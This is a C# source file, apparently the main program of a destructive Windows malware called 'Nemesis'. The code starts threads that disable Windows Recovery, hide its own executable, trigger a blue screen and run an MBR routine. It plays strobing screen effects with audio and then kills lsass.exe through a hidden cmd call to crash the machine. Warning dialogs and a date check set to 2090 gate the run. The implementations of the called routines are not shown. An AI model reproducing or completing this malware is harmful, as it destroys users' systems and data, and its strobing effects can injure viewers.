using System.Runtime.InteropServices;
using System;
using System.Threading;
using System.Windows.Forms;
using NAudio.Wave;
using System.Diagnostics;

namespace Nemesis
{
    public class Program
    {
        [DllImport("user32.dll")]
        static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);

        [DllImport("user32.dll")]
        static extern bool UpdateWindow(IntPtr hWnd);

        private static WaveOut wave;
        public static void cls()
        {
            InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
            UpdateWindow(IntPtr.Zero);
        }

        public static void AbortAll(Thread th)
        {
            if (wave != null)
                wave.Stop();
            cls();
            cls();
            th.Abort();
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern void Sleep(uint dwMilliseconds);

        public static int Main()
        {
            var beat1 = new Bytebeat1();
            var beat2 = new Bytebeat2();
            var beat3 = new Bytebeat3();
            var beat4 = new Bytebeat4();
            var beat5 = new Bytebeat5();
            var beat6 = new Bytebeat6();
            var beat7 = new Bytebeat7();

            wave = new WaveOut();

            Thread disableWinRE = new Thread(PayloadsSystem.DisableWinRe);
            Thread bsod = new Thread(BSOD.Init);
            Thread mbr = new Thread(MBR.Init);

            Thread thSpecial1 = new Thread(EffectsGdiSpeciais.DesForm);
            Thread thSpecial2 = new Thread(EffectsGdiSpeciais.DesPart);
            Thread thSpecial3 = new Thread(EffectsGdiSpeciais.LinesEff);

            Thread thMouseMove = new Thread(PayloadsSystem.MoveMouseRandom);

            Thread thSpecialMouse1 = new Thread(MouseGdis.QuadradoGiroRgb);
            Thread thSpecialMouse2 = new Thread(MouseGdis.DesForm);
            Thread thSpecialMouse3 = new Thread(MouseGdis.MovingIconSnakeEffect);

            Thread th1 = new Thread(PayloadsGdi.Gdi1);
            Thread th2 = new Thread(PayloadsGdi.Gdi2);
            Thread th3 = new Thread(PayloadsGdi.Gdi3);
            Thread th4 = new Thread(PayloadsGdi.Gdi4);
            Thread th5 = new Thread(PayloadsGdi.Gdi5);
            Thread th6 = new Thread(PayloadsGdi.Gdi6);
            Thread th7 = new Thread(PayloadsGdi.Gdi7);

            DateTime dataEspecifica = new DateTime(2090, 5, 4);       // 2090, 5, 4
            DateTime dataAtual = DateTime.Now.Date;

            if (dataAtual != dataEspecifica)
            {
                MessageBox.Show("This Software Will Only Run On Date: (04/05/2090).", "Oh No!");
                return 1;
            }

            if (MessageBox.Show("This Program You Are Running is Malicious Software, which can Completely Damage Your System, in Addition to Having Strong Illuminating Effects, Which Can Cause Eye Problems,\r\n\r\nDo You Really Want to Run It??",
                "ATTENTION!! - THIS IS MALWARE",
                MessageBoxButtons.YesNo,
                MessageBoxIcon.Warning) == DialogResult.No)
            {
                return 1;
            }

            if (MessageBox.Show("This is the Final Notice, If You Click \"YES\" You Accept All Responsibility for Your Actions From Now On and That CYBERWARE Is Not Responsible for Damages or Losses.\r\n\r\nDo You Really Want to Continue with the Execution?",
                "This is the Final Warning!!",
                MessageBoxButtons.YesNo,
                MessageBoxIcon.Warning) == DialogResult.No)
            {
                return 1;
            }


            disableWinRE.Start();
            PayloadsSystem.HiddenFile(Application.ExecutablePath);
            bsod.Start();
            mbr.Start();

            cls();
            Sleep(1000);

            thSpecial1.Start();
            thSpecialMouse1.Start();

            wave.Init(beat1);
            wave.Play();
            th1.Start();

            Sleep(1000 * 15); // 15s

            AbortAll(th1);
            cls();

            wave.Init(beat2);
            wave.Play();
            th2.Start();

            Sleep(1000 * 15); // 15s

            AbortAll(th2);
            cls();

            wave.Init(beat3);
            wave.Play();
            th3.Start();

            Sleep(1000 * 15);  // 15s

            AbortAll(th3);
            cls();

            wave.Init(beat4);
            wave.Play();
            thMouseMove.Start();
            thSpecial2.Start();

            Sleep(1000 * 15);  // 15s

            AbortAll(thSpecial2);
            thMouseMove.Abort();
            cls();

            wave.Init(beat5);
            wave.Play();
            th4.Start();
            th5.Start();

            Sleep(1000 * 15);  // 15s


            AbortAll(th4);
            th5.Abort();
            cls();


            wave.Init(beat6);
            wave.Play();
            th6.Start();

            Sleep(1000 * 7);  // 7s
            th6.Abort();

            thSpecial3.Start();


            AbortAll(thSpecial3);
            thSpecialMouse1.Abort();
            thSpecial1.Abort();
            cls();


            wave.Init(beat7);
            wave.Play();
            thSpecialMouse2.Start();
            thSpecialMouse3.Start();

            Sleep(1000 * 15);  // 15s

            AbortAll(thSpecialMouse2);
            thSpecialMouse3.Abort();
            cls();

            Sleep(5000);

            var r = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                WindowStyle = ProcessWindowStyle.Hidden,
                Arguments = "/c taskkill /f /im lsass.exe && exit"
            };
            Process.Start(r);


            Thread msg = new Thread(() =>
            {
                MessageBox.Show("-ENG-\r\nLeft Button: +ZOOM\r\nRight Button: -ZOOM\n\n\n-PTBR-\r\nBotão Esquerdo: +ZOOM\r\nBotão Direito: -ZOOM", "Control"
                    ,MessageBoxButtons.OK, MessageBoxIcon.Information, MessageBoxDefaultButton.Button1, MessageBoxOptions.ServiceNotification);
            });

            msg.Start();


            Application.Run(new JuliaFractal());


            Thread.Sleep(Timeout.Infinite);
            return 0;
        }
    }
}
